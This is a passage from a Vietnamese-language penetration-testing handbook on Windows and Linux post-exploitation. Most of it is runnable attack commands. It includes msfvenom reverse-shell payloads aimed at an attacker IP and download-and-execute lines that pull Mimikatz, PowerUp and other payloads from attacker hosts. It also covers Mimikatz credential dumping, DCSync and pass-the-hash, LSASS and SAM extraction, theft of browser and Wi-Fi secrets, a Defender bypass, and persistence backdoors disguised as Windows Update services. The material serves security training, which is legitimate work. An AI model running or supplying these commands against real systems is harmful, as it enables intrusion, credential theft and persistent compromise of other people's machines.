## Tải và thực thi Seatbelt
Invoke-WebRequest -Uri "http://[your-server]/Seatbelt.exe" -OutFile "C:\Users\Public\Seatbelt.exe"
C:\Users\Public\Seatbelt.exe -group=all > C:\Users\Public\seatbelt_results.txt
```

##### PowerSploit/PowerUp
```powershell
## Tải và thực thi PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://[your-server]/PowerUp.ps1')
Invoke-AllChecks | Out-File -FilePath C:\Users\Public\powerup_results.txt
```


## 4.3. Privilege Escalation Techniques

Privilege escalation (leo thang đặc quyền) là quá trình chuyển từ quyền hạn thấp lên quyền cao hơn (thường là Administrator/SYSTEM) trên hệ thống Windows. Đây là một bước quan trọng trong quá trình kiểm thử thâm nhập sau khi đã có được quyền truy cập ban đầu vào hệ thống.

### Quy trình leo thang đặc quyền

Việc leo thang đặc quyền trên Windows thường tuân theo quy trình sau:

1. **Enumeration**: Thu thập thông tin hệ thống
2. **Identification**: Xác định các lỗ hổng tiềm năng
3. **Exploitation**: Khai thác lỗ hổng được phát hiện
4. **Persistence**: Duy trì quyền truy cập đã được nâng cao

### Công cụ tự động hóa quá trình kiểm tra

Trước khi đi sâu vào từng kỹ thuật cụ thể, hãy làm quen với các công cụ tự động hóa giúp kiểm tra nhanh các lỗ hổng leo thang đặc quyền:

#### PowerShell Empire / PowerUp
```powershell
## Tải và thực thi PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

#### WinPEAS
```cmd
## Chạy WinPEAS để kiểm tra toàn diện
winPEASx64.exe quiet cmd fast > winpeas_results.txt
```

#### Seatbelt
```cmd
## Seatbelt là công cụ thu thập thông tin hệ thống
Seatbelt.exe -group=all
```

Mặc dù các công cụ tự động rất hữu ích, bạn vẫn cần hiểu rõ các kỹ thuật cụ thể để có thể phát hiện và khai thác hiệu quả các lỗ hổng leo thang đặc quyền.

### Các kỹ thuật leo thang đặc quyền chính

#### 4.3.1. Service Misconfigurations

Các lỗ hổng liên quan đến cấu hình dịch vụ Windows là một trong những vector leo thang đặc quyền phổ biến nhất. Các dịch vụ thường chạy với quyền SYSTEM, vì vậy nếu bạn có thể kiểm soát được dịch vụ, bạn có thể thực thi mã với đặc quyền SYSTEM.

##### Kiểm tra quyền trên dịch vụ
```powershell
## Kiểm tra quyền với AccessChk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

## Kiểm tra dịch vụ chi tiết với WMI
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

##### Khai thác dịch vụ có thể sửa đổi
```powershell
## Thay đổi đường dẫn bin của dịch vụ
sc config [service_name] binpath= "C:\path\to\malicious.exe"

## Khởi động lại dịch vụ
sc stop [service_name]
sc start [service_name]
```

#### 4.3.2. Unquoted Service Paths

Khi đường dẫn đến file thực thi của dịch vụ có khoảng trắng và không được đặt trong dấu ngoặc kép, Windows sẽ tìm kiếm và thực thi chương trình theo từng phần của đường dẫn.

##### Tìm dịch vụ có đường dẫn không đặt trong ngoặc kép
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """
```

##### Khai thác
```powershell
## Ví dụ: Dịch vụ với đường dẫn: C:\Program Files\My Program\service.exe
## Tạo file độc hại tại: C:\Program.exe hoặc C:\Program Files\My.exe

## Tạo payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o C:\Program.exe

## Cấp quyền thực thi
icacls "C:\Program.exe" /grant Everyone:F

## Khởi động lại dịch vụ
sc stop [service_name]
sc start [service_name]
```

#### 4.3.3. AlwaysInstallElevated

AlwaysInstallElevated là một cài đặt chính sách cho phép người dùng không có quyền quản trị cài đặt các gói Windows Installer (.msi) với đặc quyền SYSTEM.

##### Kiểm tra cài đặt AlwaysInstallElevated
```powershell
## Kiểm tra registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## Cả hai key cần có giá trị 1
```

##### Khai thác
```powershell
## Tạo MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o malicious.msi

## Cài đặt MSI
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

#### 4.3.4. Token Impersonation

Token impersonation là kỹ thuật giả mạo token xác thực của người dùng khác để có được đặc quyền của họ.

##### Kiểm tra quyền impersonation
```powershell
whoami /priv
```

Tìm các quyền như:
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

##### Khai thác Potato Attacks

**Rotten/Juicy Potato** (Windows 10 1809 và trước đó)
```cmd
JuicyPotato.exe -t * -p C:\path\to\reverse_shell.exe -l 1337
```

**PrintSpoofer** (Windows 10/Server 2019)
```cmd
PrintSpoofer.exe -i -c "C:\path\to\reverse_shell.exe"
```

**RoguePotato** (Windows 10/Server 2019)
```cmd
RoguePotato.exe -r <attacker_ip> -e "C:\path\to\reverse_shell.exe" -l 9999
```

#### 4.3.5. Registry Exploits

Registry Windows chứa nhiều thông tin quan trọng có thể bị khai thác để leo thang đặc quyền.

##### AutoRun Keys

```powershell
## Kiểm tra các AutoRun keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

## Kiểm tra quyền
accesschk.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

## Thêm payload
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\malicious.exe" /f
```

##### Credentials in Registry

```powershell
## Tìm kiếm mật khẩu trong registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

## Kiểm tra AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

#### 4.3.6. DLL Hijacking

DLL hijacking xảy ra khi một ứng dụng tìm kiếm các DLL theo thứ tự không an toàn, cho phép kẻ tấn công đặt DLL độc hại để được nạp thay vì DLL chính hãng.

##### Tìm DLL tiềm năng

```powershell
## Sử dụng Process Monitor để theo dõi
## Filter: Result is "NAME NOT FOUND" và Path kết thúc bằng ".dll"

## Kiểm tra quyền trên thư mục
icacls "C:\Program Files\Vulnerable Application"
```

##### Khai thác

```powershell
## Tạo DLL độc hại
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o malicious.dll

## Đặt DLL vào vị trí thích hợp
copy malicious.dll "C:\Program Files\Vulnerable Application\missing.dll"

## Khởi động lại ứng dụng
```

#### 4.3.7. Kernel Exploits

Lỗ hổng kernel thường là lựa chọn cuối cùng do tính không ổn định, nhưng chúng có thể rất hiệu quả nếu hệ thống không được cập nhật bản vá.

##### Xác định phiên bản hệ điều hành và hotfixes

```powershell
## Thông tin hệ thống
systeminfo

## Hotfixes đã cài đặt
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

##### Các exploit phổ biến

- **MS16-032**: Windows 7-10/Server 2008-2012 R2 (x86/x64)
- **MS15-051**: Windows 7-8.1/Server 2008-2012 (x86/x64)
- **CVE-2020-0796** (SMBGhost): Windows 10 versions 1903/1909
- **CVE-2021-34527** (PrintNightmare): Multiple Windows versions

##### Sử dụng công cụ Watson/Sherlock để tìm kiếm
```powershell
## Tải và chạy Watson
.\Watson.exe
```

#### 4.3.8. Stored Credentials

Windows thường lưu trữ thông tin đăng nhập trong nhiều vị trí khác nhau trên hệ thống.

##### Kiểm tra thông tin đăng nhập lưu trữ

```powershell
## Windows Credential Manager
cmdkey /list

## Thực thi lệnh với thông tin đăng nhập đã lưu
runas /savecred /user:admin "cmd.exe /c whoami > C:\Users\Public\whoami.txt"

## Kiểm tra tệp cấu hình
dir /s /b *pass* == *cred* == *vnc* == *.config* == *.txt*
findstr /si password *.xml *.ini *.txt *.config
```

##### Kiểm tra PowerShell History
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### 4.3.9. Các phương pháp leo thang đặc quyền nâng cao

##### Scheduled Tasks
```powershell
## Liệt kê scheduled tasks
schtasks /query /fo LIST /v

## Kiểm tra quyền trên file thực thi của task
icacls "C:\path\to\scheduled\task.exe"
```

##### SeBackup & SeRestore Privileges
```powershell
## Nếu có SeBackup/SeRestore privileges
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save

## Dump hash trên máy tấn công
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

##### UAC Bypass
```powershell
## Sử dụng tiện ích UACME
UacMe.exe 23 "C:\path\to\reverse_shell.exe"

## Sử dụng eventvwr bypass
Start-Process eventvwr.exe
## DLL planting trong C:\Users\<user>\AppData\Local\Microsoft\Event Viewer\RecentViews
```


## 4.4. Credential Harvesting

Credential harvesting là quá trình thu thập thông tin xác thực từ hệ thống Windows đã bị xâm nhập. Đây là một bước quan trọng trong quá trình kiểm thử thâm nhập, đặc biệt là trong các môi trường Active Directory, nơi thông tin xác thực có thể được sử dụng để thực hiện các cuộc tấn công tiếp theo như lateral movement hay privilege escalation.

### 4.4.1. Mimikatz Usage

Mimikatz là công cụ mạnh mẽ nhất để thu thập thông tin xác thực trên Windows.

#### Tải và Chuẩn bị Mimikatz

```powershell
## Tải Mimikatz bằng PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/Invoke-Mimikatz.ps1')

## Hoặc sử dụng certutil
certutil.exe -f -urlcache http://attacker-ip/mimikatz.exe C:\temp\mimikatz.exe
```

#### Các lệnh cơ bản của Mimikatz

```powershell
## Chạy Mimikatz với quyền debug (thường cần quyền Administrator)
privilege::debug

## Dump các mật khẩu từ memory (plain text nếu có thể)
sekurlsa::logonpasswords

## Dump các Kerberos tickets
sekurlsa::tickets /export

## Dump NTLM hash từ memory
sekurlsa::msv

## Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:HASH_HERE /run:powershell.exe

## Thực hiện DCSync để dump NTDS.dit
lsadump::dcsync /domain:contoso.local /user:krbtgt
```

#### Sử dụng Mimikatz thông qua PowerShell

```powershell
## Invoke-Mimikatz (nếu đã nạp script)
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

## Thực thi trong memory để tránh AV/EDR
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

#### Bypass Windows Defender

```powershell
## Obfuscated PowerShell command
$mimikatz = "powershell mimi"
$mimikatz = $mimikatz.replace('mimi', 'katz.exe')
Start-Process $mimikatz -ArgumentList '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
```

### 4.4.2. SAM & SYSTEM Extraction

SAM (Security Account Manager) và SYSTEM là hai file registry chứa thông tin xác thực user trên máy Windows local.

#### Truy xuất SAM và SYSTEM từ Registry

```cmd
## Export các registry hives
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```

#### Sử dụng Volume Shadow Copy để lấy file

```powershell
## Tạo shadow copy
wmic shadowcopy call create Volume='C:\'

## Lấy đường dẫn Shadow Copy
vssadmin list shadows

## Copy các file từ Shadow Copy (thay thế path phù hợp)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

#### Xử lý các file SAM và SYSTEM với Impacket

```bash
## Trên máy attacker (Linux)
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

#### Sử dụng PowerShell để tìm file SAM và SYSTEM

```powershell
## Tìm file SAM và SYSTEM
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include "SAM" | Where-Object { $_.FullName -like "*\System32\config\SAM" }
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include "SYSTEM" | Where-Object { $_.FullName -like "*\System32\config\SYSTEM" }
```

### 4.4.3. DPAPI Abuse

DPAPI (Data Protection API) được Windows sử dụng để bảo vệ dữ liệu nhạy cảm như mật khẩu trình duyệt, khóa WiFi, và thông tin đăng nhập của các ứng dụng.

#### Thu thập Master Keys

```powershell
## Tìm các DPAPI Master Keys
dir "C:\Users\*\AppData\Roaming\Microsoft\Protect\*" -Force

## Sử dụng Mimikatz để trích xuất master key
dpapi::masterkey /in:"C:\Users\username\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\file.masterkey" /sid:S-1-5-21-...
```

#### Thu thập Credentials từ Trình duyệt

```powershell
## Thu thập credentials từ Chrome với Mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

## Chuyển các databases của trình duyệt về máy attacker để phân tích
copy "%localappdata%\Google\Chrome\User Data\Default\Login Data" C:\temp\chrome_logins
```

#### Thu thập thông tin WiFi

```powershell
## Liệt kê các WiFi profile
netsh wlan show profile

## Export WiFi profile cụ thể
netsh wlan export profile name="WiFi-Name" key=clear folder=C:\temp
```

#### Thu thập Credentials từ Windows Credential Manager

```powershell
## Liệt kê credentials lưu trữ
cmdkey /list

## Sử dụng Mimikatz để trích xuất
vault::cred
vault::list
```


#### Kết hợp với LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) là công cụ để trích xuất mật khẩu lưu trữ cục bộ từ nhiều nguồn khác nhau.

```powershell
## Tải và chạy LaZagne
Invoke-WebRequest -Uri "http://attacker-ip/LaZagne.exe" -OutFile "C:\temp\LaZagne.exe"
C:\temp\LaZagne.exe all > C:\temp\lazagne_results.txt
```

### 4.4.5. Trích xuất từ Memory Dumps

#### Tạo Memory Dump của LSASS (Local Security Authority Subsystem Service)

```powershell
## Sử dụng Task Manager
## Tìm lsass.exe trong Task Manager > Details > Right-click > Create dump file

## Hoặc sử dụng comsvcs.dll (cần quyền Admin)
$lsassPid = Get-Process lsass | Select-Object -ExpandProperty Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full
```

#### Phân tích LSASS Dump

```powershell
## Sử dụng Mimikatz
sekurlsa::minidump C:\temp\lsass.dmp
sekurlsa::logonPasswords

## Trên máy attacker Linux với Pypykatz
pypykatz lsa minidump lsass.dmp
```


## 4.5. Persistence Mechanisms

Cơ chế duy trì quyền truy cập (persistence mechanisms) là các kỹ thuật được sử dụng để đảm bảo rằng kẻ tấn công có thể duy trì quyền truy cập vào hệ thống Windows ngay cả sau khi hệ thống được khởi động lại hoặc sau khi người dùng đăng xuất. Trong quá trình kiểm thử thâm nhập, việc thiết lập các cơ chế duy trì quyền truy cập là bước quan trọng để chứng minh tác động của việc xâm nhập.

### Các loại cơ chế duy trì quyền truy cập

#### 1. Startup Folder

Cách đơn giản nhất để duy trì quyền truy cập là đặt shortcut hoặc executable trong thư mục startup. Các file trong thư mục này sẽ được thực thi mỗi khi người dùng đăng nhập.

```powershell
## Thư mục startup của người dùng hiện tại
$userStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

## Thư mục startup cho tất cả người dùng
$allUserStartup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

## Tạo shortcut độc hại trong thư mục startup
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$userStartup\UpdateChecker.lnk")
$Shortcut.TargetPath = "C:\temp\malicious.exe"
$Shortcut.Save()
```

#### 1. Registry Run Keys

Registry Run keys là vị trí phổ biến để các chương trình được thực thi tự động khi Windows khởi động hoặc khi người dùng đăng nhập.

```powershell
## Thêm entry cho người dùng hiện tại
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\temp\malicious.exe" -PropertyType String

## Thêm entry cho tất cả người dùng (cần quyền Administrator)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\temp\malicious.exe" -PropertyType String

## Các Run keys khác có thể sử dụng
## HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
## HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
## HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices
## HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
## HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
```

#### 3. Scheduled Tasks

Scheduled tasks là một cách mạnh mẽ để duy trì quyền truy cập và có thể được cấu hình để chạy với quyền system.

```powershell
## Tạo scheduled task chạy mỗi giờ
schtasks /create /tn "Windows Update Check" /tr "C:\temp\malicious.exe" /sc hourly /ru "SYSTEM"

## Tạo scheduled task chạy khi người dùng đăng nhập
schtasks /create /tn "Windows Updater" /tr "C:\temp\malicious.exe" /sc onlogon

## Tạo scheduled task kích hoạt khi hệ thống khởi động
schtasks /create /tn "System Checker" /tr "C:\temp\malicious.exe" /sc onstart

## Sử dụng PowerShell để tạo task nâng cao hơn
$action = New-ScheduledTaskAction -Execute "C:\temp\malicious.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Windows Updates" -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"
```

#### 3. Windows Services

Tạo và cấu hình Windows Service là một cách mạnh mẽ để duy trì quyền truy cập ở mức SYSTEM.

```cmd
## Tạo service mới với sc.exe
sc create "WindowsHelper" binpath= "C:\temp\malicious.exe" start= auto
sc description "WindowsHelper" "Critical Windows Update Service"
sc start "WindowsHelper"
```

Sử dụng PowerShell:
```powershell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\malicious.exe" -DisplayName "Windows Helper Service" -StartupType Automatic -Description "Critical Windows component"
Start-Service -Name "WindowsHelper"
```

#### 5. WMI Event Subscription

WMI (Windows Management Instrumentation) Event Subscription là một kỹ thuật persistence ít được biết đến nhưng rất mạnh mẽ và khó phát hiện.

```powershell
## Tạo WMI permanent event subscription
$filterName = "WindowsUpdateFilter"
$consumerName = "WindowsUpdateConsumer"
$exePath = "C:\temp\malicious.exe"

## Tạo event filter cho sự kiện khởi động
$wmiParams = @{
    Name = $filterName
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $wmiParams

## Tạo command line consumer
$wmiParams = @{
    Name = $consumerName
    CommandLineTemplate = $exePath
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $wmiParams

## Liên kết filter và consumer
$wmiParams = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $wmiParams
```

#### 6. Logon Scripts

Logon Scripts được thực thi mỗi khi người dùng đăng nhập vào hệ thống.

```powershell
## Thiết lập logon script cho người dùng cụ thể
$logonScriptPath = "C:\temp\script.ps1"
$regPath = "HKCU:\Environment"
Set-ItemProperty -Path $regPath -Name "UserInitMprLogonScript" -Value $logonScriptPath

## Hoặc thông qua Group Policy (cần quyền domain admin)
## Cài đặt trong: Computer Configuration > Windows Settings > Scripts > Logon
```

#### 7. COM Hijacking

COM (Component Object Model) Hijacking cho phép các mã độc được thực thi thông qua việc thay thế các DLL hợp pháp.

```powershell
## Tìm các CLSID có thể khai thác
reg query "HKCR\CLSID" /s /f "LocalServer32" | findstr "InprocServer32"

## Thay đổi đường dẫn của CLSID
$clsid = "{00000000-0000-0000-0000-000000000000}" ## Thay bằng CLSID thực
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\temp\malicious.dll"
```

#### 8. DLL Search Order Hijacking

Kỹ thuật này lợi dụng cách Windows tìm kiếm DLL khi một ứng dụng cố gắng tải chúng.

```powershell
## Đặt DLL độc hại vào thư mục của ứng dụng với tên trùng với DLL hợp pháp
## Hoặc đặt trong một thư mục có trong PATH
copy malicious.dll "C:\Program Files\Legitimate App\original.dll"

## Tạo DLL có thể thực thi code độc hại:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o malicious.dll
```

#### 9. Application Shimming

Application Shimming là một cơ chế tương thích ứng dụng trong Windows có thể bị lạm dụng để duy trì quyền truy cập.

```cmd
## Sử dụng Compatibility Administrator để tạo shim database (.sdb file)
## Đây là một quy trình phức tạp hơn cần sử dụng giao diện đồ họa
```

#### 4. Backdoored Files

Thay thế hoặc sửa đổi các tệp tin hợp pháp để thực thi mã độc hại.

```powershell
## Ví dụ: Thay thế legitimate.exe bằng malicious version
Rename-Item -Path "C:\Program Files\App\legitimate.exe" -NewName "legitimate.exe.bak"
Copy-Item -Path "C:\temp\malicious.exe" -Destination "C:\Program Files\App\legitimate.exe"
```

### Kỹ thuật persistence nâng cao

#### 1. BITS Jobs (Background Intelligent Transfer Service)

BITS là một dịch vụ Windows cho phép chuyển file trong nền, có thể bị lạm dụng để duy trì persistence.

```powershell
## Tạo BITS job vĩnh viễn
Import-Module BitsTransfer
$job = Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\temp\payload.exe" -Asynchronous
Add-BitsFile -BitsJob $job -Source "http://attacker.com/trigger.txt" -Destination "C:\temp\trigger.txt"
Set-BitsTransfer -BitsJob $job -Complete -CustomNotifyCmdLine "C:\temp\payload.exe"
```

#### 1. Screensaver Hijacking

Thay thế screensaver mặc định bằng payload độc hại.

```powershell
## Thiết lập screensaver độc hại
Copy-Item -Path "C:\temp\malicious.scr" -Destination "C:\Windows\System32\malicious.scr"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -Value "C:\Windows\System32\malicious.scr"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -Value "1"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeOut" -Value "60"
```

#### 3. Winlogon Helper DLL

Winlogon Helper DLL là một cơ chế Windows sử dụng để xử lý sự kiện đăng nhập.

```powershell
## Thiết lập Notify Package
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty -Path $regPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\temp\malicious.exe,"

## Hoặc sử dụng shell key
Set-ItemProperty -Path $regPath -Name "Shell" -Value "explorer.exe,C:\temp\malicious.exe"
```

#### 3. AppInit_DLLs

AppInit_DLLs là một registry key cho phép tải các DLL vào mọi ứng dụng sử dụng user32.dll.

```powershell
## Thiết lập AppInit_DLLs (cần tắt Secure Boot)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
Set-ItemProperty -Path $regPath -Name "AppInit_DLLs" -Value "C:\temp\malicious.dll"
Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1
```

#### 5. Image File Execution Options (IFEO)

IFEO ban đầu được tạo ra để debug ứng dụng, nhưng có thể bị lạm dụng để chuyển hướng việc thực thi.

```powershell
## Thiết lập IFEO Debugger
$targetApp = "sethc.exe" ## Sticky Keys - có thể thay bằng ứng dụng khác
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetApp"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\temp\malicious.exe"
```

# 5. Linux Post-Exploitation

Post-exploitation trên Linux là quá trình thực hiện các hành động sau khi đã có được quyền truy cập vào hệ thống Linux. Quá trình này bao gồm việc thu thập thông tin, leo thang đặc quyền, duy trì quyền truy cập, và di chuyển ngang trong mạng.

## 5.1. System Enumeration

Enumeration (liệt kê) là bước đầu tiên và quan trọng nhất sau khi có quyền truy cập vào hệ thống Linux. Mục tiêu là thu thập càng nhiều thông tin càng tốt về hệ thống, người dùng, mạng, và các dịch vụ đang chạy.

### 5.1.1. Basic System Information

```bash
# Kiểm tra thông tin kernel và hệ điều hành
uname -a
cat /proc/version
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release

# Kiểm tra hostname
hostname

# Kiểm tra thông tin phần cứng
lscpu
free -h
df -h

# Kiểm tra thời gian hệ thống
date
uptime

# Kiểm tra các ứng dụng đã cài đặt
dpkg -l      # Debian/Ubuntu
rpm -qa      # RHEL/CentOS
pacman -Q    # Arch Linux

# Kiểm tra các biến môi trường
env
```

### 5.1.2. User Enumeration

```bash
# Thông tin người dùng hiện tại
id
whoami

# Liệt kê tất cả người dùng
cat /etc/passwd
awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd   # Chỉ regular users

# Lịch sử lệnh
history
cat ~/.bash_history

# Kiểm tra các tệp tin SSH
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/known_hosts

# Kiểm tra người dùng đang đăng nhập
w
who
last

# Kiểm tra sudoers
sudo -l
cat /etc/sudoers
```

### 5.1.3. Network Enumeration

```bash
# Kiểm tra interfaces
ip a
ifconfig
ip route
route

# Kiểm tra kết nối mạng
netstat -tunlp
ss -tunlp
lsof -i

# Kiểm tra iptables rules
iptables -L

# Kiểm tra hosts
cat /etc/hosts

# DNS settings
cat /etc/resolv.conf

# ARP cache
arp -a
ip neigh

# Kiểm tra các mạng không dây
iwconfig
```

### 5.1.4. Process Enumeration

```bash
# Liệt kê các tiến trình đang chạy
ps aux
ps -ef
top

# Kiểm tra các tiến trình đang lắng nghe
netstat -tunlp
ss -tunlp

# Tìm kiếm các tiến trình cụ thể
ps aux | grep apache
ps -ef | grep root

# Kiểm tra các tiến trình chạy với quyền root
ps -ef | grep root
```

### 5.1.5. Service Enumeration

```bash
# Kiểm tra các dịch vụ đang chạy
service --status-all
systemctl list-units --type=service
/etc/init.d/

# Kiểm tra startup services
ls -la /etc/init/
ls -la /etc/init.d/
ls -la /etc/rc*.d/
systemctl list-unit-files --type=service | grep enabled
```

### 5.1.6. Finding Sensitive Files

```bash
# Tìm kiếm các tệp tin cấu hình
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null

# Tìm kiếm các tệp tin nhạy cảm
find / -name "id_rsa*" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null

# Tìm kiếm các tệp tin chứa thông tin đăng nhập
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -r "username" /etc/ 2>/dev/null

# Kiểm tra web server files
ls -la /var/www/
ls -la /var/www/html/
cat /etc/apache2/sites-enabled/000-default.conf
cat /etc/nginx/sites-enabled/default

# Kiểm tra các tệp tin cơ sở dữ liệu
find / -name "*.db" -type f 2>/dev/null
find / -name "*.sqlite" -type f 2>/dev/null
ls -la /var/lib/mysql/
```

### 5.1.7. Finding Interesting Locations

```bash
# Tìm kiếm các thư mục và tệp tin có quyền ghi cho tất cả người dùng
find / -type d -perm -o+w 2>/dev/null
find / -type f -perm -o+w 2>/dev/null

# Tìm kiếm các tệp tin có SUID/SGID bit
find / -type f -perm -u=s -ls 2>/dev/null      # SUID
find / -type f -perm -g=s -ls 2>/dev/null      # SGID

# Tìm kiếm các thư mục writable
find / -writable -type d 2>/dev/null

# Tìm kiếm các tệp tin cấu hình cron jobs
ls -la /etc/cron*
cat /etc/crontab
```

### 5.1.8. Automated Enumeration

Có nhiều công cụ tự động hóa quá trình enumeration trên Linux:

```bash
# LinPEAS - Linux Privilege Escalation Awesome Script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# linux-smart-enumeration
curl -L https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | sh -s -- -l1

# pspy - Unprivileged process snooping
./pspy64 -pf -i 1000
```

## 5.2. Privilege Escalation Vectors

Privilege Escalation (leo thang đặc quyền) là quá trình nâng cao quyền từ người dùng thông thường lên quyền root hoặc các quyền cao hơn.

### 5.2.1. SUID Binaries

SUID (Set User ID) là bit đặc biệt cho phép người dùng chạy tệp thực thi với quyền của chủ sở hữu tệp.

```bash
# Tìm kiếm các tệp SUID
find / -type f -perm -4000 -ls 2>/dev/null

# Khai thác SUID binaries phổ biến
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/nmap --interactive     # Versions cũ
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
/usr/bin/perl -e 'exec "/bin/sh -p"'

# Kiểm tra GTFOBins cho khai thác SUID
# https://gtfobins.github.io/
```

### 5.2.2. Sudo Misconfigurations

